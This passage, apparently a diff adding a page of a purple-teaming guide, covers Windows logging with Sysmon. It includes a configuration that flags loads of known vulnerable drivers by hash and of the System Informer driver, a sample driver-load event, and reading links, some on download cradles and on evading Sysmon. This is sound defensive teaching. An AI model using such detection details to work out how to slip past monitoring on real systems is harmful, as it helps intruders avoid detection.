+      <span class="nt">&lt;data</span> <span class="na">name=</span><span class="s">"RuleName"</span> <span class="na">inType=</span><span class="s">"win:UnicodeString"</span> <span class="na">outType=</span><span class="s">"xs:string"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;data</span> <span class="na">name=</span><span class="s">"UtcTime"</span> <span class="na">inType=</span><span class="s">"win:UnicodeString"</span> <span class="na">outType=</span><span class="s">"xs:string"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;data</span> <span class="na">name=</span><span class="s">"ImageLoaded"</span> <span class="na">inType=</span><span class="s">"win:UnicodeString"</span> <span class="na">outType=</span><span class="s">"xs:string"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;data</span> <span class="na">name=</span><span class="s">"Hashes"</span> <span class="na">inType=</span><span class="s">"win:UnicodeString"</span> <span class="na">outType=</span><span class="s">"xs:string"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;data</span> <span class="na">name=</span><span class="s">"Signed"</span> <span class="na">inType=</span><span class="s">"win:UnicodeString"</span> <span class="na">outType=</span><span class="s">"xs:string"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;data</span> <span class="na">name=</span><span class="s">"Signature"</span> <span class="na">inType=</span><span class="s">"win:UnicodeString"</span> <span class="na">outType=</span><span class="s">"xs:string"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;data</span> <span class="na">name=</span><span class="s">"SignatureStatus"</span> <span class="na">inType=</span><span class="s">"win:UnicodeString"</span> <span class="na">outType=</span><span class="s">"xs:string"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/event&gt;</span>
+    --snip--
+  <span class="nt">&lt;/events&gt;</span>
+<span class="nt">&lt;/manifest&gt;</span>
+</code></pre></div></div>
+<p>A Sysmon configuration that monitors for driver load events where the hash matches an entry from LOLDrivers or is a tool of interest, while excluding Intel-signed drivers.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Sysmon</span> <span class="na">schemaversion=</span><span class="s">"x.xx"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;HashAlgorithms&gt;</span>*<span class="nt">&lt;/HashAlgorithms&gt;</span>
+  <span class="nt">&lt;EventFiltering&gt;</span>
+    <span class="nt">&lt;RuleGroup</span> <span class="na">name=</span><span class="s">"Vulnerable or Malicious Driver Load"</span> <span class="na">groupRelation=</span><span class="s">"or"</span><span class="nt">&gt;</span> 
+      <span class="nt">&lt;DriverLoad</span> <span class="na">onmatch=</span><span class="s">"include"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;Hashes</span> <span class="na">name=</span><span class="s">"LOLDriver Match"</span> <span class="na">condition=</span><span class="s">"contains"</span><span class="nt">&gt;</span>SHA256=56066ed07bad3b5c1474e8fae5ee2543d17d7977369b34450bd0775517e3b25c<span class="nt">&lt;/Hashes&gt;</span>
+        <span class="nt">&lt;Hashes</span> <span class="na">name=</span><span class="s">"LOLDriver Match"</span> <span class="na">condition=</span><span class="s">"contains"</span><span class="nt">&gt;</span>SHA256=06a0ec9a316eb89cb041b1907918e3ad3b03842ec65f004f6fa74d57955573a4<span class="nt">&lt;/Hashes&gt;</span>
+      <span class="nt">&lt;/DriverLoad&gt;</span>         
+    <span class="nt">&lt;/RuleGroup&gt;</span>
+    <span class="nt">&lt;RuleGroup</span> <span class="na">name=</span><span class="s">"Exclude Intel Drivers"</span> <span class="na">groupRelation=</span><span class="s">"or"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;DriverLoad</span> <span class="na">onmatch=</span><span class="s">"exclude"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;Signature</span> <span class="na">condition=</span><span class="s">"begin with"</span><span class="nt">&gt;</span>Intel <span class="nt">&lt;/Signature&gt;</span>
+      <span class="nt">&lt;/DriverLoad&gt;</span>
+    <span class="nt">&lt;/RuleGroup&gt;</span>
+    <span class="nt">&lt;RuleGroup</span> <span class="na">name=</span><span class="s">"Tools of interest"</span> <span class="na">groupRelation=</span><span class="s">"or"</span><span class="nt">&gt;</span> 
+      <span class="nt">&lt;DriverLoad</span> <span class="na">onmatch=</span><span class="s">"include"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;ImageLoaded</span> <span class="na">name=</span><span class="s">"Suspicious Tool Driver Load: System Informer"</span> <span class="na">condition=</span><span class="s">"contains"</span><span class="nt">&gt;</span>systeminformer.sys<span class="nt">&lt;/ImageLoaded&gt;</span>
+      <span class="nt">&lt;/DriverLoad&gt;</span>
+    <span class="nt">&lt;/RuleGroup&gt;</span>
+  <span class="nt">&lt;/EventFiltering&gt;</span>
+<span class="nt">&lt;/Sysmon&gt;</span>
+</code></pre></div></div>
+<p>The command to load a Sysmon config using the Sysmon binary.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sysmon.exe <span class="nt">-c</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\a</span><span class="s2">nsible</span><span class="se">\d</span><span class="s2">rivers-sysmon.xml"</span>
+
+Loading configuration file with schema version x.xx
+Configuration file validated.
+Configuration updated.
+</code></pre></div></div>
+<p>An example of the kernel driver load event produced with the above Sysmon configuration.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Event</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/win/events/event"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;System&gt;</span>
+    <span class="nt">&lt;Provider</span> <span class="na">Name=</span><span class="s">"Microsoft-Windows-Sysmon"</span> <span class="na">Guid=</span><span class="s">"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;EventID&gt;</span>6<span class="nt">&lt;/EventID&gt;</span> 
+    <span class="nt">&lt;Level&gt;</span>4<span class="nt">&lt;/Level&gt;</span> 
+    --snip--
+    <span class="nt">&lt;EventRecordID&gt;</span>3673<span class="nt">&lt;/EventRecordID&gt;</span> 
+    <span class="nt">&lt;Execution</span> <span class="na">ProcessID=</span><span class="s">"2792"</span> <span class="na">ThreadID=</span><span class="s">"3420"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;Channel&gt;</span>Microsoft-Windows-Sysmon/Operational<span class="nt">&lt;/Channel&gt;</span> 
+    <span class="nt">&lt;Computer&gt;</span>ar-win-dc<span class="nt">&lt;/Computer&gt;</span> 
+    <span class="nt">&lt;Security</span> <span class="na">UserID=</span><span class="s">"S-1-5-18"</span> <span class="nt">/&gt;</span> 
+  <span class="nt">&lt;/System&gt;</span>
+  <span class="nt">&lt;EventData&gt;</span>
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"RuleName"</span><span class="nt">&gt;</span>Suspicious Tool Driver Load: System Informer***<span class="nt">&lt;/Data&gt;</span>
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"ImageLoaded"</span><span class="nt">&gt;</span>C:\Program Files\SystemInformer\SystemInformer.sys***<span class="nt">&lt;/Data&gt;</span>
+    --snip--
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"Hashes"</span><span class="nt">&gt;</span>SHA1=DB08DBE68A6C9BB29550E33CE95CE54CAF83E925,MD5=10BFCFC0215DAE77FB84BE8B2E63110E,SHA256=96A37B18EDE4B5BC616822C023B1B8CD85B3A76B205229701E21D75EA101B57C,IMPHASH=D6A8D3591C46C44511F288817529A6B4<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"Signed"</span><span class="nt">&gt;</span>true<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"Signature"</span><span class="nt">&gt;</span>Microsoft Windows Hardware Compatibility Publisher<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"SignatureStatus"</span><span class="nt">&gt;</span>Valid<span class="nt">&lt;/Data&gt;</span> 
+  <span class="nt">&lt;/EventData&gt;</span>
+<span class="nt">&lt;/Event&gt;</span>
+</code></pre></div></div>
+<hr />
+<h2 id="resources">Resources</h2>
+<p>The following resources expand on topics covered in this chapter.
+<br />
+<br /></p>
+<h4 id="windows-event-logs-1">Windows Event Logs</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Details from Microsoft on the standard event logs available and how they're configured in the Windows Registry</h6>
+               <p><i>"Eventlog Key," Microsoft, accessed April 28, 2024</i></p>
+                <a target="_blank" href="https://learn.microsoft.com/en-us/windows/win32/eventlog/eventlog-key" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>An invaluable reference for Windows event log and Sysmon event data</h6>
+               <p><i>"Windows Security Log Encyclopedia," Ultimate Windows Security, accessed March 30, 2024</i></p>
+                <a target="_blank" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A guide to Windows event log forwarding (WEF)</h6>
+               <p><i>"The Windows Event Forwarding Survival Guide," Chris Long, July 24, 2017</i></p>
+                <a target="_blank" href="https://medium.com/hackernoon/the-windows-event-forwarding-survival-guide-2010db7a68c4" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Utilizing native logging provided by audit policy and System Access Control Lists (SACLs) to detect various post-exploitation behaviours</h6>
+               <p><i>"Detecting Windows Endpoint Compromise with SACLs," Dane Stuckey, July 16, 2018</i></p>
+                <a target="_blank" href="https://medium.com/@cryps1s/detecting-windows-endpoint-compromise-with-sacls-cd748e10950" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>More details on using XPath queries to filter and query Windows event log</h6>
+               <p><i>"Event Queries and Event XML," Microsoft, July 28, 2009</i></p>
+                <a target="_blank" href="https://learn.microsoft.com/en-us/previous-versions/bb399427(v=vs.90)" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Guidance from Microsoft on default event log audit policy configuration, as well as recommended and elevated logging policy configurations</h6>
+               <p><i>"Audit Policy Recommendations," Microsoft, August 3, 2023</i></p>
+                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Microsoft's guidance on effective Windows event logging for defending Active Directory deployments</h6>
+               <p><i>"Monitoring Active Directory for Signs of Compromise," Microsoft, February 15, 2023</i></p>
+                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/monitoring-active-directory-for-signs-of-compromise" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Microsoft's extensive list of events to monitor</h6>
+               <p><i>"Appendix L: Events to Monitor," Microsoft, June 8, 2022</i></p>
+                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="powershell-logging-1">PowerShell Logging</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Notice of the deprecation of PowerShell version 2</h6>
+               <p><i>"Windows PowerShell 2.0 Deprecation," Microsoft, August 24, 2017</i></p>
+                <a target="_blank" href="https://devblogs.microsoft.com/powershell/windows-powershell-2-0-deprecation/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>An example Sigma rule for the detection of PowerShell downgrade attacks</h6>
+               <p><i>"proc_creation_win_powershell_downgrade_attack.yml," Harish Segar, January 4, 2023</i></p>
+                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_downgrade_attack.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The suspicious cmdlets and script elements that triggers production of script block logging events</h6>
+               <p><i>"CompiledScriptBlock.cs," GitHub, accessed April 28, 2024</i></p> 
+                <a target="_blank" href="https://github.com/PowerShell/PowerShell/blob/a32700a1c15a227bde54a0b80fa83cbe47bd2f27/src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs#L1832-L1968" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Other examples of PowerShell download cradles from Will Schroeder</h6>
+               <p><i>"DownloadCradles.ps1," Will Schroeder, accessed March 30, 2014</i></p>
+                <a target="_blank" href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>More detail on PowerShell logging features and configuration options</h6>
+               <p><i>"Greater Visibility Through PowerShell Logging," Matthew Dunwoody, February 11, 2016</i></p>
+                <a target="_blank" href="https://www.mandiant.com/resources/blog/greater-visibility" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>An overview of AMSI and its architecture, as well as demonstrations of its effect on file-less malware</h6>
+               <p><i>"How the Antimalware Scan Interface (AMSI) helps you defend against malware," Microsoft, August 23, 2019</i></p>
+                <a target="_blank" href="https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A thoroughly detailed walkthrough of AMSI and the telemetry it can produce</h6>
+               <p><i>"Better know a data source: Antimalware Scan Interface," Jimmy Astle, Matt Graeber, July 19, 2022</i></p>
+                <a target="_blank" href="https://redcanary.com/blog/amsi/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="sysmon-1">Sysmon</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A comparison between the telemetry and detection engineering aspects of Sysmon and the Microsoft Defender for Endpoint EDR solution</h6>
+               <p><i>"Sysmon vs Microsoft Defender for Endpoint, MDE Internals 0x01," Olaf Hartong, October 15, 2021</i></p>
+                <a target="_blank" href="https://medium.com/falconforce/sysmon-vs-microsoft-defender-for-endpoint-mde-internals-0x01-1e5663b10347" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>@SwiftOnSecurity’s Sysmon configuration, designed as a performant and highly-tuned option. Used in the Attack Range lab environment by default</h6>
+               <p><i>"sysmon-config," @SwiftOnSecurity, accessed May 24, 2024</i></p>
+                <a target="_blank" href="https://github.com/SwiftOnSecurity/sysmon-config" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Olaf Hartong’s <code>sysmon-modular</code> repository provides an organized collection of Sysmon configuration snippets organized by event type, as well as a range of generated configurations that vary in verbosity and application</h6>
+               <p><i>"sysmon-modular," Olaf Hartong, accessed May 24, 2024</i></p>
+                <a target="_blank" href="https://github.com/olafhartong/sysmon-modular" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A fork of @SwiftOnSecurity’s Sysmon configuration maintained by Florian Roth, Tobias Michalski, Christian Burkard and Nasreddine Bencherchali. This configuration extends the original with additional entries for known offensive tool indicators and exploits</h6>
+               <p><i>"sysmon-config," Florian Roth, Tobias Michalski, Christian Burkard and Nasreddine Bencherchali, accessed May 24, 2024</i></p>
+                <a target="_blank" href="https://github.com/Neo23x0/sysmon-config" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>An offensive perspective on operating on hosts monitored with Sysmon</h6>
+               <p><i>"Operating Offensively Against Sysmon," Carlos Perez, October 8, 2018</i></p>
+                <a target="_blank" href="https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Extracting Sysmon configuration from Windows Registry</h6>
+               <p><i>"SysmonRuleParser.ps1," Matt Graeber, accessed March 30, 2024</i></p>
+                <a target="_blank" href="https://github.com/mattifestation/PSSysmonTools/blob/master/PSSysmonTools/Code/SysmonRuleParser.ps1" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The lab environment Linux Sysmon configuration</h6>
+               <p><i>"SysMonLinux-CatchAll.xml," accessed May 23, 2024</i></p>
+                <a target="_blank" href="https://github.com/splunk/attack_range/blob/develop/configs/SysMonLinux-CatchAll.xml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<div class="container">
+ <div class="row">
+   <div class="col" style="text-align: left">
+      <a href="/part-II/environment-setup/" class="btn btn-primary">&lt;&lt; Chapter 5</a>
+   </div>
+   <div class="col" style="text-align: right">
+      <a href="/part-II/network-traffic-and-event-tracing/" class="btn btn-primary">Chapter 7 &gt;&gt;</a>
+   </div>
+ </div>
+</div>
+			</article>
+		</div>
+	</main>
+		<!-- Footer -->
+ <footer class="footer-chulapa text-center mt-0 pt-3">
+   <div class="container">
+     <div class="row">
+       <div class="col-xl-10 offset-xl-1"><div role="navigation" class="d-flex flex-wrap justify-content-center"><a href="https://github.com/orgs/aguidetopurpleteaming" title="footerRepo on Github" class="chulapa-footer-sociallink lead"><span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span><span class="sr-only">Repo on Github</span>
+            </a></div><p class="mt-2 mb-3">&copy; 2025 ajpc500</p>
+          <!-- Do not remove this in order to give  attributions -->
+         <p class="chulapa-footer-brand">Powered by <a href="https://dieghernan.github.io/chulapa"> <span class="chulapa">Chulapa</span> Jekyll Theme</a><br><b>Lux</b> skin by <a href="https://bootswatch.com/">Bootswatch</a></p>
+          <!-- End  attributions -->
+       </div>
+     </div>
+ </div>
+</footer>
+<!-- Footer -->
+<!-- JS, Popper.js, and jQuery -->
+	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js"></script>
+	<!-- start custom scripts to be placed at the bottom of the page -->
+<!-- end custom bottom scripts -->
+	</body>
+</html>
